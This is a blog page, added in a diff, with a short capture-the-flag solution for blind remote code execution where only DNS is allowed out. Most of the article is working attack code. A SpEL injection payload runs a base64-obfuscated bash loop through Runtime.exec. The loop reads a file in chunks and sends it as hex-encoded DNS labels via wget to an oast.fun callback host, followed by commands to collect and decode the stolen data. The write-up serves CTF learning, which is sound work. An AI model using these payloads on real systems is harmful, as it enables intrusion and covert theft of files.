@@ -1,0 +1,89 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>DNS exfil — challenge solution · ElleuchX1</title><meta name="description" content="Blind RCE, DNS-only egress."><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="DNS exfil — challenge solution · ElleuchX1"><meta property="og:description" content="Blind RCE, DNS-only egress."><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/notes/dns-exfil-flag-c/"><meta property="og:image" content="https://elleu.ch/og/dns-exfil-flag-c.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/dns-exfil-flag-c.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/">Posts</a><a href="/notes/" aria-current="page">Notes</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/notes/">← Notes</a> <header class="article-head"> <h1 data-pagefind-meta="title">DNS exfil — challenge solution</h1> <div class="article-meta"> <time datetime="2024-05-31T00:00:00.000Z">2024-05-31</time> <span>1 min read</span> </div> <div class="article-tags"> <a href="/tags/dns/">#dns</a><a href="/tags/exfiltration/">#exfiltration</a><a href="/tags/oast/">#oast</a><a href="/tags/rce/">#rce</a> </div> </header>  <div class="prose">  <p>Example from a challenge I solved. Blind RCE, outbound HTTP blocked, DNS resolves — read the file in chunks and send it out as DNS labels.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> $(</span><span style="color:#B392F0">seq</span><span style="color:#79B8FF"> 0</span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8"> $(($(</span><span style="color:#79B8FF">stat</span><span style="color:#79B8FF"> -c%s</span><span style="color:#9ECBFF"> /flag.c</span><span style="color:#E1E4E8">)-1))); </span><span style="color:#F97583">do</span><span style="color:#E1E4E8"> a</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">dd</span><span style="color:#9ECBFF"> if=/flag.c</span><span style="color:#9ECBFF"> bs=</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF"> skip=</span><span style="color:#E1E4E8">$i </span><span style="color:#9ECBFF">count=</span><span style="color:#79B8FF">10</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> od</span><span style="color:#79B8FF"> -An</span><span style="color:#79B8FF"> -tx1</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> tr</span><span style="color:#79B8FF"> -d</span><span style="color:#9ECBFF"> ' \n'</span><span style="color:#E1E4E8">); </span><span style="color:#B392F0">wget</span><span style="color:#79B8FF"> --timeout=1</span><span style="color:#79B8FF"> --tries=1</span><span style="color:#E1E4E8"> $a</span><span style="color:#9ECBFF">.nxgjhlviuvwiipnxyeukzy1yq9diq7ri6.oast.fun</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">done</span></span></code></pre>
+<p>Delivery (SpEL, base64 to dodge quoting):</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>__${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,Zm9yIGkgaW4gJChzZXEgMCAxMCAkKCgkKHN0YXQgLWMlcyAvZmxhZy5jKS0xKSkpOyBkbyBhPSQoZGQgaWY9L2ZsYWcuYyBicz0xIHNraXA9JGkgY291bnQ9MTAgMj4vZGV2L251bGwgfCBvZCAtQW4gLXR4MSB8IHRyIC1kICcgXG4nKTsgd2dldCAtLXRpbWVvdXQ9MSAtLXRyaWVzPTEgJGEubnhnamhsdml1dndpaXBueHlldWt6eTF5cTlkaXE3cmk2Lm9hc3QuZnVuOyBkb25lCg==}|{base64,-d}|{bash,-i}")}__::x</span></span></code></pre>
+<p>Collect and decode:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> requests.json</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -oE</span><span style="color:#9ECBFF"> '[0-9a-fA-F]+\.nxgjhlviuvwiipnxyeukzy1yq9diq7ri6\.oast\.fun'</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> uniq</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> re, binascii</span></span>
+<span class="line"><span style="color:#E1E4E8">data </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> """&#x3C;labels>"""</span></span>
+<span class="line"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(binascii.unhexlify(</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.join(re.findall(</span><span style="color:#F97583">r</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">([0-9a-fA-F]</span><span style="color:#F97583">+</span><span style="color:#79B8FF">)</span><span style="color:#85E89D;font-weight:bold">\.</span><span style="color:#DBEDFF">&#x3C;oast></span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">, data))).decode(</span><span style="color:#9ECBFF">'utf-8'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">errors</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'ignore'</span><span style="color:#E1E4E8">))</span></span></code></pre>  </div>  </article> </div> <button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
